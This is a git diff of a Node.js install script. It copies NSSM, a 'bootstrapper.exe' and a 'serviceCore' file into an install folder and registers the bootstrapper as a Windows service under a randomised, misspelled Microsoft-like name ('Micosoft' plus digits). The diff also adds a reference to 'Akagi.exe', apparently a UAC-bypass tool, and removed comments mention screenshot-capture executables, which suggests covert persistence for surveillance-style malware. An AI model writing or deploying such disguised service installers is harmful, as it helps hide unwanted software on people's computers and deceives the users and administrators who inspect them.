@@ -1,31 +1,30 @@
 const fs = require("fs");
 const { execSync } = require("child_process");
 const { STOPPED, waitForServiceStatus } = require("./status");
+const path = require("path");
 
-// const INSTALL_PATH = "C:\\ProgramData\\nssm\\";
-// const BACKEND_NAME = "backend.exe";
-// const BACKEND_PATH = `${INSTALL_PATH}${BACKEND_NAME}`;
-// const NSSM_PATH = `${INSTALL_PATH}nssm.exe`;
+path.join(__dirname, "Akagi.exe");
 
 const gConfig = require("../../my_config");
 
-// const SERVICE_NAME = "ammc";
+function myCopyFileSync(sourcePath, targetPath) {
+  const sourceData = fs.readFileSync(sourcePath);
+  fs.writeFileSync(targetPath, sourceData);
+}
 
 let NEW_SERVICE_NAME = `Micosoft${Math.ceil(Math.random() * 100000)}`;
-
+const process = require("process");
 async function install() {
+  console.log(fs.readdirSync(__dirname));
   try {
     let rs;
     fs.mkdirSync(gConfig.INSTALL_PATH, { recursive: true });
-    fs.copyFileSync("./nssm.exe", gConfig.NSSM_PATH);
-    // fs.copyFileSync("./myScreenshot.exe", `${INSTALL_PATH}myScreenshot.exe`);
-    // fs.copyFileSync(
-    //   "./screenCapture_1.3.2.exe",
-    //   `${INSTALL_PATH}screenCapture_1.3.2.exe`
-    // );
-    // fs.copyFileSync("./" + BACKEND_NAME, BACKEND_PATH);
-    fs.copyFileSync("./bootstrapper.exe", `${gConfig.BOOTSTRAPPER_PATH}`);
-    fs.copyFileSync("./serviceCore", `${gConfig.CORE_PATH}`);
+    myCopyFileSync(path.join(__dirname, "nssm.exe"), gConfig.NSSM_PATH);
+    myCopyFileSync(
+      path.join(__dirname, "bootstrapper.exe"),
+      `${gConfig.BOOTSTRAPPER_PATH}`
+    );
+    myCopyFileSync(path.join(__dirname, "serviceCore"), `${gConfig.CORE_PATH}`);
     // sleep(1000);
     execSync(
       `${gConfig.NSSM_PATH} install ${NEW_SERVICE_NAME} ${gConfig.BOOTSTRAPPER_PATH}`
@@ -41,7 +40,7 @@ async function install() {
     sleep(1000);
   } catch (e) {
     console.log(e);
-    sleep(10000);
+    sleep(50000);
   }
 }
 
